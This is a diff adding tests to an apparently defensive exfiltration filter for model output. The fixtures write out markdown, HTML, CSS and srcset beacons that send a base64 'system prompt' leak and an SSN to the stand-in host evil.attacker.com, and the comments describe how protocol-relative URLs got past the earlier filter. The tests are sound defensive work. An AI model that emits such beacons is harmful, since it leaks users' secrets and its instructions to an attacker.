@@ -1098,6 +1098,49 @@ def test_g42_benign_not_defanged(label, payload):
     assert neutralize_exfil_channels(payload) == payload, f"{label}: benign mutated (FP)"
 
 
+# ── G43: PROTOCOL-RELATIVE url exfil beacons (//evil.com/…) bypassed the WHOLE defense ──
+# Every exfil regex required https?://, and neutralize even early-returned when neither
+# scheme was present, so a protocol-relative beacon (auto-fetches with the page's own
+# scheme) slipped ALL of markdown/HTML/CSS/srcset/bare + PII-in-url detection. Scheme is
+# now optional everywhere and the "//"-gate covers it; bare protorel requires a dotted
+# host + path to stay FP-safe (a//b math, // comments, //localhost are untouched).
+_G43_ARB = base64.b64encode(b"SYSTEM PROMPT leak internal BetaCorp merger Q3 deal RUBICON here").decode()
+_G43_EXFIL = [
+    ("g43_md_img",       f'![x](//evil.attacker.com/log?d={_G43_ARB})',                       _G43_ARB),
+    ("g43_html_img",     f'<img src="//evil.attacker.com/log?d={_G43_ARB}">',                 _G43_ARB),
+    ("g43_css_url",      f'<div style="background:url(//evil.attacker.com/x?d={_G43_ARB})">', _G43_ARB),
+    ("g43_srcset",       f'<img srcset="//evil.attacker.com/1?d={_G43_ARB} 1x">',             _G43_ARB),
+    ("g43_html_img_pii", f'<img src="//evil.attacker.com/t?ssn={SSN}">',                      SSN),
+    ("g43_md_link_pii",  f'[click](//evil.attacker.com/c?ssn={SSN})',                         SSN),
+    ("g43_bare_pii",     f'exfil via //evil.attacker.com/t?ssn={SSN} now',                    SSN),
+]
+
+
+@pytest.mark.parametrize("label,payload,secret", _G43_EXFIL)
+def test_g43_protocol_relative_beacon_neutralized(label, payload, secret):
+    assert list(_scan_exfil_channels(payload)), f"{label}: protocol-relative beacon not detected"
+    out = neutralize_exfil_channels(payload)
+    assert secret not in out, f"{label}: smuggled payload survived (LEAK)"
+    assert "[exfil-redacted]" in out, f"{label}: not defanged"
+
+
+# G43 false-positive floor: benign protocol-relative URLs + common '//' in prose/code.
+_G43_BENIGN = [
+    ("g43_benign_protorel_img",  '<img src="//cdn.trusted.com/assets/logo.png">'),
+    ("g43_benign_protorel_md",   '![logo](//cdn.trusted.com/logo.png)'),
+    ("g43_benign_protorel_bare", 'see //cdn.trusted.com/docs/guide for details'),
+    ("g43_cpp_comment",          'int x = 5; // compute the ratio\nreturn x;'),
+    ("g43_math_ratio",           'the ratio is 10//3 and a//b in the loop'),
+    ("g43_path_double_slash",    'the path /usr//local//bin is fine'),
+]
+
+
+@pytest.mark.parametrize("label,payload", _G43_BENIGN)
+def test_g43_benign_protocol_relative_not_touched(label, payload):
+    assert not list(_scan_exfil_channels(payload)), f"{label}: benign // flagged as exfil"
+    assert neutralize_exfil_channels(payload) == payload, f"{label}: benign // mutated (FP)"
+
+
 # ================================================================== fixed gap (now FROZEN)
 # G10 — Tier-2 semantic redact was a byte no-op. The guard model flags PII/secret with
 # no deterministic regex (free-text names, non-standard card/ID layouts, passphrases);
